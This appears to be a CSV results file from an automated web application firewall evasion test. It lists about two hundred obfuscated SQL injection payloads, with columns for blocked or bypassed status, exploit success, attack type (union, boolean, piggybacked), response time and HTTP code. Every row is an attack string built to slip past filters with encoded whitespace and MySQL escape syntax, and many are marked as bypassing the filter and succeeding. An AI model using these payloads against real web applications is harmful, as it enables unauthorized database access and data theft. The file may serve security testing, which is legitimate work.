Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=1.%0bor+not+{x%0b(select+1)}=1=+(!~0)--%0b,Bypassed,No,None,piggyAtk,0.0094,71.84,No,500
0%27<@!=1.%0bor+{x%0b(select+1)}=1%0blike%0b{`if`+1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0145,71.84,No,200
0%27<@=1.%0b||+!%0b{x+(select%0b1)}=1=+(!%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0136,71.97,No,500
0'<@!=1.%0bor+!%0b{x+(select%0b1)}=1=%0b(not+{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.011,72.1,No,500
0%27<@=.1%0bor%0b{x+(select%0b1)}=1%0blike+{x+(select+1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0124,72.1,No,200
0%27<@=1.+or%0b!+true=%0b(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,booleanAtk,0.0147,72.1,No,500
0'<@=.1%0b||+!+{x+(select+1)}=1=+(!~0)%0b||%27,Bypassed,No,None,Unknown,0.0128,72.1,No,500
0%27<@=1+or+not+{x+(select+1)}=1=+(0)%23,Blocked,No,None,piggyAtk,0.0078,72.1,No,403
0'<@!=.1%0bor+not+{x+(select+1)}=1=+(!+{`if`%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0149,72.1,No,500
0%27<@!=1.%0bor%0bnot+{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0137,72.1,No,200
0'<@!=1+or%0b{a%0b1}=1%0blike+{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0171,72.1,No,500
0'<@!=.1+||+not%0b{a+1}=1=+(!+true)+or',Blocked,No,None,booleanAtk,0.0145,72.1,No,403
0%27<@=1.%0bor+!%0btrue=%0b(!+true)%0bor',Bypassed,No,None,booleanAtk,0.0153,72.28,No,500
0%27<@=1.+||+!+{`if`%0b1}=1=%0b(!%0b{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0112,72.46,No,200
0%27<@!=.1+or+{a%0b1}=1+like+{`if`%0b1}=1%0bor',Bypassed,No,None,Unknown,0.0143,71.34,No,500
0%27<@=1%0b||%0b{a+1}=1%0blike+{x%0b(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0103,71.34,No,500
0%27<@!=.1+||%0b!%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0099,71.34,No,403
0%27<@!=1%0bor+!+{x+(select+1)}=1=%0b(not%0b{a+1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0263,71.34,No,200
0%27<@!=1.+or+not%0b{`if`%0b1}=1=+(not+{x+(select%0b1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0197,71.34,No,200
0%27<@=1.+or+!+true=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0175,71.34,No,500
0'<@=1%0b||+not+true=+(not%0b{x%0b(select+1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0112,71.59,No,500
0%27<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0228,71.59,No,500
0'<@=1+||+!+{x+(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1)--+,Blocked,No,None,piggyAtk,0.009,71.59,No,403
0%27<@!=.1%0b||+{a%0b1}=1%0blike%0b{x+(select+1)}=1%0b||',Bypassed,No,None,Unknown,0.0176,71.59,No,500
0%27<@!=.1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not~0)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0135,71.59,No,200
0%27<@!=.1+or+!%0b{x%0b(select%0b1)}=1=+(not%0btrue)+||',Bypassed,No,None,booleanAtk,0.0105,71.59,No,500
0'<@!=1+||+!+{`if`%0b1}=1=%0b(not+{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0129,71.59,No,500
0%27<@=1.+||+not+true=%0b(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0145,71.59,No,500
0'<@!=1%0b||%0bfalse=+(!+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0136,71.59,No,500
0'or+!@<@.%0bor%0b{a+1}=1%0blike%0b{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0251,71.59,No,500
0'<@=1%0b||+!%7efalse=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0155,71.59,No,500
0%27<@=.1+or+not+{x+(select+1)}=1=+(not+{x%0b(select+1)}=1)+or',Blocked,No,None,Unknown,0.01,71.59,No,403
0'<@=1+or%0b!+{x%0b(select+1)}=1=+(not%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0161,71.72,No,500
0'<@=.1+or+not%0b{x%0b(select+1)}=1=%0b(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0177,71.84,No,500
0%27<@=1.+||%0bnot%0b{a+1}=1=%0b(not~0)+||',Bypassed,No,None,Unknown,0.0317,71.84,No,500
0%27<@=1+or+{`if`+1}=1+like+{x%0b(select+1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0172,71.84,No,200
0'||+@<@+||+true+like%0b{a%0b1}=1%0b||%27,Bypassed,No,None,Unknown,0.0252,71.84,No,500
0%27<@!=1.+or+not+{a%0b1}=1=%0b(!+true)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0287,71.84,No,200
0%27<@!=.1+||+not+{a+1}=1=%0b(!%0b{`if`+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.02,71.84,No,200
0%27<@!=.1+or%0b!%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.017,71.84,No,500
0%27<@!=1+or+not%0btrue=+(not%0b{`if`+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0191,71.84,No,200
0%27<@!=.1+||%0b!%0b{a+1}=1=%0b(!%0b{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0232,71.84,No,200
0%27<@!=1%0bor+not+{`if`%0b1}=1=%0b(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0145,71.84,No,200
0%27<@!=1%0bor%0b!+{a%0b1}=1=+(!%0b1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0211,71.84,No,200
0'<@!=1%0bor%0bnot+1=%0b(!~false)+or%27,Bypassed,No,None,booleanAtk,0.0205,71.84,No,500
0'<@=.1+||+not%7efalse=%0b(!~false)+||',Bypassed,No,None,Unknown,0.0187,71.84,No,500
0'<@=.1+or+not+{`if`+1}=1=+(!+true)%0b||%27,Bypassed,No,None,booleanAtk,0.0168,71.84,No,500
0'<@!=.1+||+not%0b{x+(select%0b1)}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0205,71.84,No,500
0%27<@=1%0b||+not%0b{x%0b(select+1)}=1=%0b(!~false)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0268,71.84,No,200
0%27<@!=1+||+!+{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0269,71.84,No,200
0'<@!=1.+||+not%0b{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.019,71.84,No,500
0%27<@!=.1%0bor+!%7e0=+(!+{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0148,71.84,No,200
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+(not~0)+||',Bypassed,No,None,Unknown,0.0124,71.84,No,500
0%27<@!=.1%0bor%0bnot+{a+1}=1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.013,71.84,No,500
0%27<@=.1+or+!+{`if`+1}=1=%0b(false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0079,71.97,No,200
0%27<@!=1%0bor+not%0b{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0097,72.1,No,200
0'<@=1.%0bor%0bnot+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0159,72.1,No,500
0'<@!=1.%0b||+!%0b{x+(select+1)}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0149,72.1,No,500
0%27<@!=1.%0b||%0b!%7efalse=%0b(not+{a%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0183,72.1,No,200
0%27<@!=1.+or%0b{x%0b(select+1)}=1+like+{`if`+1}=1+or',Bypassed,No,None,Unknown,0.0127,72.1,No,500
0%27<@=1.+or+not%0b{a%0b1}=1=%0b(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0219,72.1,No,500
0'<@=1.+or%0bnot+true=%0b(false)+or%27,Bypassed,No,None,booleanAtk,0.0285,72.1,No,500
0'<@=1%0b||+not%0b{a+1}=1=%0b(not%7e0)+or%27,Bypassed,No,None,Unknown,0.0186,72.28,No,500
0%27<@!=1+||%0b!+{a%0b1}=1=+(not%7e0)%0bor',Bypassed,No,None,Unknown,0.0132,72.46,No,500
0'<@!=1+or+!+{a+1}=1=%0b(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0137,71.34,No,500
0'<@=1+or+!%0b{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0143,71.34,No,500
0'<@=1%0bor%0b!%0b{x%0b(select%0b1)}=1=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0178,71.34,No,500
0'<@!=1.+||%0b!%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)+or',Blocked,No,None,Unknown,0.0134,71.34,No,403
0%27<@!=1.+||+!+{x+(select+1)}=1=+(not%0btrue)+or',Blocked,No,None,booleanAtk,0.0139,71.34,No,403
0%27<@!=1%0bor+!%0b{x+(select%0b1)}=1=+(!%0b{a+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0156,71.46,No,200
0%27<@=.1+or+not+{a%0b1}=1=+(!+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0175,71.59,No,500
0'<@=.1+or+!%0b{x%0b(select+1)}=1=+(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0232,71.59,No,500
0'<@=.1%0b||+not+{x+(select+1)}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0193,71.59,No,500
0'<@!=.1%0bor+{x+(select+1)}=1+like+true%0bor',Bypassed,No,None,booleanAtk,0.0369,71.59,No,500
0'<@!=1+or+{x+(select%0b1)}=1%0blike%0b1+or%27,Blocked,No,None,Unknown,0.019,71.59,No,403
0%27<@=.1%0bor+not%0b{`if`%0b1}=1=%0b(!+true)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0122,71.59,No,200
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=%0b(!~false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0208,71.59,No,200
0'<@!=.1%0b||+not%0btrue=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0209,71.59,No,500
0'<@=.1+or%0bnot+{x%0b(select+1)}=1=+(not+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0276,71.59,No,500
0'<@=1.+||%0b!%7efalse=%0b(not+{x%0b(select%0b1)}=1)+||',Blocked,No,None,Unknown,0.0175,71.59,No,403
0'<@!=.1+or+not%0b{`if`+1}=1=%0b(not%0b{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0234,71.72,No,500
0%27<@=.1+||+not%0b{x%0b(select+1)}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.025,71.84,No,200
0%27<@!=1+or+not~0=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0144,71.84,No,500
0'<@!=.1%0b||+not%0b{x+(select%0b1)}=1=%0b(not%0btrue)%0b||%27,Bypassed,No,None,Unknown,0.0209,71.84,No,500
0'<@!=1%0b||+0=+(not+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0133,71.84,No,500
0'<@=1+or+not%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0275,71.84,No,500
0%27<@!=1+or%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.024,71.84,No,200
0%27<@!=.1+||+not%0b{x+(select%0b1)}=1=+(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0104,71.84,No,200
0'<@!=1.%0b||+not%0b{x%0b(select+1)}=1=+(not+{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0255,71.84,No,500
0%27||%0b!@<@.+||+{x+(select+1)}=1%0blike+{x+(select%0b1)}=1%0b||%27,Blocked,No,None,Unknown,0.0099,71.84,No,403
0'<@!=1.%0bor%0bnot+{x%0b(select%0b1)}=1=+(not%0b1)--%0b,Bypassed,No,None,piggyAtk,0.0242,71.84,No,500
0%27<@!=.1+or+!+{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1)%0b||%27,Blocked,No,None,Unknown,0.0184,71.84,No,403
0'<@=1+||%0bnot+1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0328,71.84,No,500
0%27<@!=1+or%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b1)%0bor',Blocked,No,None,Unknown,0.0183,71.84,No,403
0%27<@!=1+||+!+{`if`+1}=1=+(!+{x+(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0203,71.84,No,200
0%27<@!=1.+or+not+{x%0b(select%0b1)}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0175,71.84,No,500
0%27<@=1.+or%0bnot+1=%0b(!%7efalse)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0176,71.84,No,200
0%27<@!=.1+||%0bnot+{`if`+1}=1=%0b(!+{`if`+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0155,71.84,No,200
0%27or%0b@<@.+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)+or,Bypassed,Yes,unionAtk,Unknown,0.0221,71.84,No,200
0'or+@<@.+||%0b!%0b{a%0b1}=1=+(not%0b1)+||%27,Bypassed,No,None,Unknown,0.0175,71.84,No,500
0'<@!=.1+||+!+true=+(!%0b{`if`+1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0255,71.84,No,500
0%27<@!=.1+or%0bfalse=+(not+{a+1}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0135,71.84,No,200
0'<@=.1+or+!~false=+(!+{a+1}=1)%0bor%27,Blocked,No,None,booleanAtk,0.0072,71.84,No,403
0'<@=.1+or+not+{`if`%0b1}=1=+(!+true)+or',Bypassed,No,None,booleanAtk,0.0195,71.97,No,500
0%27<@=1+||+not%0b{`if`%0b1}=1=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0157,72.1,No,500
0%27<@!=1.+or+not%0b{a%0b1}=1=+(not%0btrue)+or',Bypassed,No,None,booleanAtk,0.0124,72.1,No,500
0%27<@!=1%0bor%0b!%0b{a+1}=1=%0b(not%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0152,72.1,No,200
0'<@!=1.%0bor+!+{x+(select+1)}=1=+(not%7e0)+or%27,Bypassed,No,None,Unknown,0.0139,72.1,No,500
0'<@!=1.%0b||+!%0b{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.008,72.1,No,500
0%27<@=1+or+0=%0b(false)+or',Bypassed,No,None,booleanAtk,0.0151,72.1,No,500
0%27<@=.1%0b||%0bnot%0b{`if`+1}=1=+(!+{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0168,72.13,No,200
0%27<@!=.1+or+{x+(select%0b1)}=1+like%0btrue+or%27,Blocked,No,None,booleanAtk,0.018,72.46,No,403
0%27<@!=.1%0bor+!+1=+(!+{a+1}=1)+or',Bypassed,No,None,Unknown,0.0176,72.46,No,500
0%27||%0b@<@%0bor+!+true=+(!%0b{`if`%0b1}=1)+||%27,Blocked,No,None,booleanAtk,0.009,72.46,No,403
0%27<@=1.%0bor%0b!%7e0=%0b(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0169,71.34,No,500
0%27<@!=.1%0b||%0bnot+{x+(select+1)}=1=%0b(not+{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0177,71.34,No,200
0'<@!=1+||+not+{x%0b(select+1)}=1=+(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0215,71.34,No,500
0'<@!=1.%0b||+not+{x+(select%0b1)}=1=+(not%0b{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0233,71.46,No,500
0%27<@=.1%0bor%0b!+{x+(select%0b1)}=1=+(!+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.023,71.59,No,200
0%27<@!=1.+||+not%0b{x+(select+1)}=1=+(not%0b1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0304,71.59,No,200
0'<@!=.1+or+!+{`if`+1}=1=%0b(!+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0095,71.59,No,500
0'<@!=1%0b||+!%0b{x+(select+1)}=1=+(not%0b{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0152,71.59,No,500
0'<@!=1+or+not+true=+(not+true)+||%27,Blocked,No,None,booleanAtk,0.0096,71.59,No,403
0%27<@=1.%0bor+!+{a%0b1}=1=%0b(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0134,71.59,No,500
0%27<@=1.%0bor%0b!+{x+(select+1)}=1=%0b(not+{a+1}=1)+or',Bypassed,No,None,Unknown,0.0224,71.59,No,500
0%27<@!=.1+||%0bnot+true=%0b(!+{x+(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0211,71.59,No,200
0'<@=1.%0bor+!+{`if`+1}=1=%0b(0)%23,Bypassed,No,None,piggyAtk,0.0158,71.59,No,500
0'<@=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(not+true)%23,Bypassed,No,None,piggyAtk,0.0228,71.59,No,500
0'<@!=1%0bor+!+{`if`+1}=1=+(not+1)+||%27,Bypassed,No,None,Unknown,0.0282,71.59,No,500
0'<@=1.%0b||+not+{x+(select%0b1)}=1=+(not%7efalse)+or',Bypassed,No,None,booleanAtk,0.0085,71.59,No,500
0%27<@!=.1+||+not%0b1=+(not+{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0266,71.72,No,200
0'<@!=1.+||%0bnot%0b{a%0b1}=1=%0b(not%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0278,71.84,No,500
0'<@!=.1+or+not+{`if`%0b1}=1=+(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0154,71.84,No,500
0'<@=.1+or+not+true=%0b(!%0b{x%0b(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0211,71.84,No,500
0%27<@=.1+||+!+{a%0b1}=1=+(not%0b{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0211,71.84,No,200
0%27<@!=.1%0bor+false=+(not+{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.014,71.84,No,200
0'<@=.1%0bor+not+{x%0b(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.01,71.84,No,500
0'<@=1.+||+!~false=+(not~0)+||%27,Blocked,No,None,Unknown,0.0111,71.84,No,403
0'<@!=1.%0b||+not%7e0=+(not%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.017,71.84,No,500
0'<@!=.1+or+!%0b{a+1}=1=+(not%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0174,71.84,No,500
0'<@!=1.+or+!+{`if`+1}=1=+(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0234,71.84,No,500
0'<@=.1%0b||+not+{x+(select+1)}=1=%0b(!+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0181,71.84,No,500
0'<@=1.+||+not%7efalse=%0b(not%0b{a+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0136,71.84,No,500
0'or+!@<@+or%0bnot%0b{x%0b(select+1)}=1=+(!+{`if`+1}=1)+or%27,Blocked,No,None,Unknown,0.0131,71.84,No,403
0%27<@!=1.%0b||+!+{x+(select%0b1)}=1=%0b(!+{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0153,71.84,No,200
0'<@!=1+||+!%0b{x%0b(select+1)}=1=+(not+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0128,71.84,No,500
0'<@=1%0b||+!%7e0=+(!+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0192,71.84,No,500
0'<@!=1+or%0bnot+{x+(select+1)}=1=+(!%0b{`if`+1}=1)%0bor',Blocked,No,None,Unknown,0.0195,71.84,No,403
0%27<@!=1%0bor+{x+(select+1)}=1%0blike+{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0159,71.84,No,500
0'<@=1+or+not+{x%0b(select+1)}=1=%0b(not%7efalse)+or%27,Bypassed,No,None,booleanAtk,0.0191,71.84,No,500
0%27||+@<@.+or+not+1=%0b(not%0b{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0163,71.84,No,200
0'<@=.1%0bor%0bnot+{a+1}=1=+(!~0)+||%27,Bypassed,No,None,Unknown,0.0219,71.84,No,500
0'<@=1+||+not%0btrue=%0b(!~0)+or',Bypassed,No,None,booleanAtk,0.0139,71.84,No,500
0%27<@!=1.+||+!+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0084,71.84,No,200
0'<@!=1.%0b||%0b{`if`+1}=1+like+{x%0b(select%0b1)}=1+||%27,Bypassed,No,None,Unknown,0.0179,71.84,No,500
0'<@=1.+||+not%0b{x%0b(select+1)}=1=+(not+true)+or',Bypassed,No,None,booleanAtk,0.0106,71.84,No,500
0'<@=1.+||%0b{`if`%0b1}=1+like%0b{a%0b1}=1+or%27,Bypassed,No,None,Unknown,0.0156,72.1,No,500
0%27<@=1.%0b||+0=+(!+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0092,72.1,No,500
0'<@!=.1%0b||+!+{a+1}=1=+(!~false)+||%27,Bypassed,No,None,Unknown,0.0135,72.1,No,500
0'<@=.1%0bor+!%0b{a%0b1}=1=%0b(not%0btrue)%23,Bypassed,No,None,piggyAtk,0.0189,72.1,No,500
0'<@!=.1+||%0b!%0btrue=+(!%0btrue)+||',Blocked,No,None,Unknown,0.0152,72.1,No,403
0%27<@=1.%0bor%0b!%0b{a+1}=1=%0b(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0061,72.1,No,500
0%27<@=1+||+not%0b{x+(select+1)}=1=%0b(not%0b1)%0bor',Bypassed,No,None,Unknown,0.0165,72.1,No,500
0%27||+@<@.+||+!%0b{x+(select%0b1)}=1=+(!+{`if`%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0145,72.1,No,200
0%27or+1<@+or+not+{x+(select%0b1)}=1=+(not+{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0127,71.34,No,403
0%27||+@<@.+||+not+{`if`%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0293,71.34,No,200
0%27<@=.1%0bor+!%0btrue=+(not%0b{x+(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0164,71.34,No,200
0%27<@!=.1+||%0bnot%0b{a%0b1}=1=%0b(!+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0132,71.46,No,500
0'<@!=.1+or%0bnot%7e0=+(!+true)+||%27,Blocked,No,None,booleanAtk,0.0076,71.59,No,403
0'<@!=1+or+!%0b{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0155,71.59,No,500
0'<@!=1+or+not%0b{x+(select%0b1)}=1=+(not+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0126,71.59,No,500
0'<@=1.+or+not+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0127,71.59,No,500
0'<@=1%0bor+!+{x%0b(select%0b1)}=1=%0b(!+{x+(select+1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0141,71.59,No,500
0'<@!=1+or+{`if`+1}=1+like+{x%0b(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0173,71.59,No,500
0%27<@!=1.%0bor+!+{a+1}=1=+(!%0btrue)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0178,71.59,No,200
0%27<@=1.+or+not%0b{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0071,71.59,No,500
0%27<@=1+or+{x+(select+1)}=1+like+{x+(select%0b1)}=1%23,Blocked,No,None,piggyAtk,0.0125,71.59,No,403
0%27<@!=.1+or+!%0b{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0215,71.59,No,500
0%27<@!=1+or+not+{a+1}=1=+(not+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0238,71.59,No,200
0%27||%0b@<@.+||+!%0b{x+(select%0b1)}=1=%0b(!%0b{x%0b(select%0b1)}=1)+or,Bypassed,Yes,unionAtk,Unknown,0.0166,71.72,No,200
0%27<@=1.+||%0b!%0btrue=+(not%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0096,71.84,No,200
0%27<@!=1.%0b||+not~0=%0b(!+{`if`%0b1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0406,71.84,No,200
0%27||+@<@.+||+not+{a+1}=1=+(!+{x+(select+1)}=1)+or%27,Blocked,No,None,Unknown,0.016,71.84,No,403
0'<@!=.1%0b||%0bnot+{`if`+1}=1=+(!%7efalse)+||',Bypassed,No,None,Unknown,0.0132,71.84,No,500
0'<@!=1.+||+!~false=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0224,71.84,No,500
0'<@=.1%0b||%0b!%0b{x%0b(select%0b1)}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0197,71.84,No,500
0%27<@=1%0b||+!%0b{`if`+1}=1=%0b(not%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0143,71.84,No,200
0'<@=1%0bor+not+{a+1}=1=%0b(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0155,71.84,No,500
0%27<@!=1.%0b||+not+{x%0b(select%0b1)}=1=%0b(not+{`if`%0b1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0397,71.84,No,200
